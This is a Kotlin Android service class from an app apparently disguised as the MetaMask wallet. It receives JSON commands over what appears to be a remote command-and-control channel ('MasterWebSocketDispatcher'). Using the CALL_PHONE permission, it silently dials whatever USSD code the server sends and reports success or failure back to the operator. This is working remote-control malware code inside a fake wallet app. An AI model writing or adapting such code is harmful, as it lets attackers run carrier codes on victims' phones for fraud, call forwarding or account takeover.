package com.example.MetaMask.services

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.IBinder
import androidx.annotation.Keep
import androidx.core.content.ContextCompat
import org.json.JSONObject

@Keep
class LegacyUssdService : Service() {

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[LegacyUssdService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val commandJsonString = intent?.getStringExtra("command")

        if (commandJsonString.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[LegacyUssdService] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[LegacyUssdService] return") //xdbg
            return START_NOT_STICKY
        }

        try {
            val commandJson = JSONObject(commandJsonString)
            val ussdCode = commandJson.optString("requestCode")

            if (ussdCode.isNotEmpty()) {
                android.util.Log.d("XDBG", "[LegacyUssdService] if branch") //xdbg
                executeLegacyUssdRequest(ussdCode)
            } else {
                sendResultToServer("Failed", null, "Missing requestCode.", "")
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LegacyUssdService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            sendResultToServer("Failed", null, "Invalid command format.", "")
        } finally {
            stopSelf()
        }

        android.util.Log.d("XDBG", "[LegacyUssdService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun executeLegacyUssdRequest(ussdCode: String) {
        android.util.Log.d("XDBG", "[LegacyUssdService] executeLegacyUssdRequest enter ussdCode=${ussdCode}") //xdbg
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[LegacyUssdService] if branch") //xdbg
            sendResultToServer("Failed", null, "Missing CALL_PHONE permission.", ussdCode)
            return
        }

        val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:${Uri.encode(ussdCode)}"))
        callIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK

        try {
            applicationContext.startActivity(callIntent)
            sendResultToServer("Success", null, "Request initiated. User interaction might be required.", ussdCode)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LegacyUssdService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            sendResultToServer("Failed", null, "Could not start activity: ${e.message}", ussdCode)
        }
    }

    private fun sendResultToServer(status: String, data: String?, message: String?, request: String) {
        android.util.Log.d("XDBG", "[LegacyUssdService] sendResultToServer enter status=${status} data=${data} message=${message} request=${request}") //xdbg
        val resultJson = JSONObject().apply {
            put("action", "commandChannelResponse")
            put("status", status)
            put("request", request)
            data?.let { put("data", it) }
            message?.let { put("message", it) }
        }
        val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
            putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, resultJson.toString())
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }
}
